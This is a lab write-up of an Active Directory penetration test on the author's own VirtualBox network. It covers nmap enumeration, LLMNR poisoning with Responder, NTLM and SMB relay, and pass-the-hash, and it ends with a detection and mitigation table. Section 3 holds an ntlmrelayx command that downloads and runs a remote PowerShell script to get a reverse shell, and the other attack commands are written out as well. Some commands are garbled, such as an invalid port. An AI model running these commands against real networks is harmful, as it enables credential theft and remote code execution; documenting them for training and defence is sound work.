# Active Directory Penetration Testing Lab

A lab built to simulate a real enterprise Active Directory environment and practice offensive security techniques including enumeration, credential attacks, lateral movement, and privilege escalation.

# 🖥️ Lab Environment
| Component | Details |
| --- | --- |
| Virtualisation | VirtualBox |
| Domain Controller | Windows Server 2022 |
| Host | Windows 10 Enterprise |
| Attacker Machine | Kali linux |

# Network topology:
Windows Sercer 2022 acts as the Domain Controller (DC)
Windows 10 enterprise are the host on the domain, there are 2 host.
Kali Linux is the Perpetrator machine used in this

# Tools Used
| Tool | Purpose |
| --- | --- |
| nmap | map the network, view the services active, service version |
| Responder | LLMNR/NBT-NS poisioning, credential capture, NTLM shell invoke |
| Ipmacket-ntlmrelayx | SMB relay attacks |
| netcat | capture the shell |
| psexec | Pass the hash to gain shell |
| John | crack the hashes captured |

# Attack Techniques Covered

1. Initial Enumeration
Used the nmap to view all the services running in the host and domain controller, ports used and the servic version. Focused mostly on smb as it was the main focus of this lab.

3. LLMNR Poisioning
Exploited the Link-local Multicast Name Resolution (LLMNR) protocol to capture NTLMv2 hashes from machines attempting to resolve hostnames on the network.
```
sudo responder -I eth0 -dPv
```
When a Windows machine fails DNS resolution, it broadcasts an LLMNR query. Responder intercepts this and responds, causing the victim to authenticate — sending their NTLMv2 hash.

3. NTLM shell invoke using responder
The attack leverages NTLM relay via WPAD/LLMNR poisoning to capture and forward authentication attempts to a target system lacking SMB signing. The relayed session is then used to execute a remotely hosted PowerShell script, resulting in arbitrary command execution and a reverse shell connection.
```
sudo responder -I eth0 -dwv
```
```
impacket-ntlmrelayx -tf iptargets.txt -smb2support -c "powershell IEX(NEW-Object Net.WebClient).downloadString('http://192.168.0.69:80000/Downloads/shells.ps1')"
```
When a Windows machine fails DNS resolution, it sends out an LLMNR/WPAD broadcast to find the requested host. Responder intercepts this request and replies as the legitimate server, forcing the victim to authenticate to the attacker. The victim then sends an NTLMv2 authentication challenge-response, which can be captured and relayed using ntlmrelayx to another target, where it is accepted as valid and used for remote execution.

4. SMB relay and relay with interactive shell
Then attack leverages LLMNR/NBT-NS poisioning to intercept authentication attempts broadcast by windows hosts failing dns resolution. Responder captures NTLMv2 challenge-response and forwards it to ntlmrelayx, which relays credentials to a target host lacking SMB signing enforcement. Since the target cannot verify authenticity of the relayed session, it accepts the credentials as legititmate, allowing an interactive shell.

```
impacket-ntlmrelayx -tf iptargets.txt -smb2support -i
```
5. Pass-the-hash
Once we obtain NTLM hashes we can pass it, as the windows accepts it as valid credentials, without needing the plaian text password.

```
impacket-psexec administrator@192.168.0.72 -hashes
```
# Detection and mititgation
| Technique | Detetction | Mititgation |
| --- | --- | --- |
| LLMNR poisioning | Monitor for the LLMNR traffic on the network | Disable LLMNR and NBT-NS via GPO |
| SMB relay | Detect ntlmrelayx signatures, unusual SMB sesions | Enable SMB signing on all hosts |
| NTLM shell | Unusual powershell execution. outbound connections | Application whitelisting, contrained language mode |
| Pass-the-hash | EventID 4624 logon type 3, lateral movement alerts | Enable Protected users group, disable NTLM where possible

# Disclaimer
This lab is built entirely for educational purposes in an isolated environment. All techniques emonstrated here are performed on the systems I own and control. Performing these attacks on systems without explicit authorisation is illegal.




   
   

